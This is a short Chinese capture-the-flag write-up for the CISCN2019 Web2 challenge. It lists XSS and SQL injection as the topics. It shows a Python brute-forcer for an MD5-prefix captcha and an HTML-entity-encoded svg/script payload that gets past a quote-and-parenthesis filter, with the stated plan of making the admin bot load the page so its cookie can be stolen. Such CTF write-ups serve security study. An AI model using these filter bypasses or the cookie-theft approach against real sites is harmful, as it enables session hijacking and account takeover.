# \[CISCN2019 华东北赛区]Web2

## \[CISCN2019 华东北赛区]Web2

## 考点

* xss
* sql注入

## wp

登录注册，有个投稿和反馈的功能。

投稿输入

```javascript
<img src="ssssss.png" onerror="javascript:alert(1)" /> 
```

得到文章页面，访问发现存在过滤

```javascript
<img waf等于号”ssssss.png”="" onerror等于号”javascript:alert（1）”="">
```

反馈处有提示`请输入有问题的网址。我会亲自查看`，应该是个XSS，在投稿插入XSS语句，在反馈处让bot访问XSS页面窃取cookie

反馈处的验证要求验证码md5的前6位符合要求，爆破脚本如下

```python
import hashlib

for i in range(1, 10000001):
    s = hashlib.md5(str(i)).hexdigest()[0:6]
    if s == "199a59":
        print(i)
        break
```

接下来是如何绕过XSS的过滤。测试发现会把`英文的单双引号，英文的括号`换成`中文`的，然后`<,>svg,eval,script`都没过滤。可以尝试HTML实体编码绕过，`'`是`&#x27;`，`"`是`&#x22;`，`(`是`&#x28;`，`)`是`&#x29;`，=是`&#x3D;`

payload：

```
<svg><script>eval&#x28;alert&#x28;1&#x29;&#x29;</script></svg>
```

